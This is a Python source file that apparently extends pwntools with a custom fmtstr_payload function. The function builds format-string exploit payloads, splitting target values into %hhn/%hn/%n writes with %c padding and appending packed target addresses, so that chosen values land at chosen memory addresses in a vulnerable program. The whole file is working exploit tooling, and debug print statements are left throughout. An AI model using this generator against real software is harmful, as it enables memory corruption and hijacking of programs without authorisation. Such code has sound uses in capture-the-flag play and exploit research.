import logging
import re

from pwnlib.log import getLogger
from pwnlib.context import context
from pwn import p64, p32
import operator

log = getLogger(__name__)


def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):

    # 'byte' : (number, step, mask, format, decalage)
    config = {
        32: {
            'byte': (4, 1, 0xff, 'hh', 8),
            'short': (2, 2, 0xffff, 'h', 16),
            'int': (1, 4, 0xffffffff, '', 32),
        },
        64: {
            'byte': (8, 1, 0xff, 'hh', 8),
            'short': (4, 2, 0xffff, 'h', 16),
            'int': (2, 4, 0xffffffff, '', 32)
        }
    }

    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    number, step, mask, formatz, decalage = config[context.bits][write_size]

    to_write = {}

    def _split_write(what, where, mask, decalage, step):
        # I found out that the writing is to be signed int, we only use the positive part of that.
        # So we have to consider the overflow kinda thing.
        write_value_limit = (1 << (decalage - 1)) - 1 if mask != 0xff else 0xff
        value = what & mask
        this_where = where
        this_writes = {}
        while value:
            if value >= write_value_limit:
                values = _split_write(value, this_where, mask >> 8, decalage >> 1, step >> 1)
                this_writes.update(values)
            else:
                this_writes[this_where] = value
            what >>= decalage
            value = what & mask
            this_where += step
            print("value {}".format(value))
        print(this_writes)
        return this_writes

    splitted_writes = {}
    print(writes.items())
    for where, what in writes.items():
        splitted_writes.update(_split_write(what, where, mask, decalage, step))
    print("splitted writes")
    print(splitted_writes)

    payload = ""
    blank_chars = 0
    write_addr_seq = []
    print(sorted(splitted_writes.items(), key=operator.itemgetter(1)))
    for where, what in sorted(splitted_writes.items(), key=operator.itemgetter(1)):
        need_write_chars = what - numbwritten
        if need_write_chars:
            payload += "%{}c".format(need_write_chars)

        payload += "%{}$" + formatz + "n"
        numbwritten += need_write_chars
        blank_chars += 2
        write_addr_seq.append(where)

    if len(payload) < 8:
        payload = payload.ljust(8, 'a')

    buf_written = len(payload)
    addr_size = 8 if context.bits == 64 else 4
    print("buf written {}".format(buf_written))
    filled_len = ((buf_written - 1) & ~(addr_size - 1)) + addr_size

    ok = False
    now_filled_len = filled_len
    print("filled len {}".format(filled_len))
    while not ok:
        real_index_in_chars = 0
        index_start = offset + (now_filled_len / addr_size)
        index_end = offset + (now_filled_len / addr_size) + len(splitted_writes)
        for i in range(index_start, index_end):
            real_index_in_chars += len(str(i))
        print("real index in chars {}".format(real_index_in_chars))
        buf_written += real_index_in_chars - blank_chars
        blank_chars = real_index_in_chars
        print("now buf {}".format(buf_written))
        now_filled_len = ((buf_written - 1) & ~(addr_size - 1)) + addr_size
        print("now filled len {}".format(now_filled_len))
        if now_filled_len == filled_len:
            ok = True
        filled_len = now_filled_len

    payload += 'a' * (now_filled_len - buf_written)
    write_indexes = []
    for i in range(index_start, index_end):
        write_indexes.append(i)
    payload = payload.format(*write_indexes)

    for where in write_addr_seq:
        payload += p64(where) if context.bits == 64 else p32(where)

    return payload

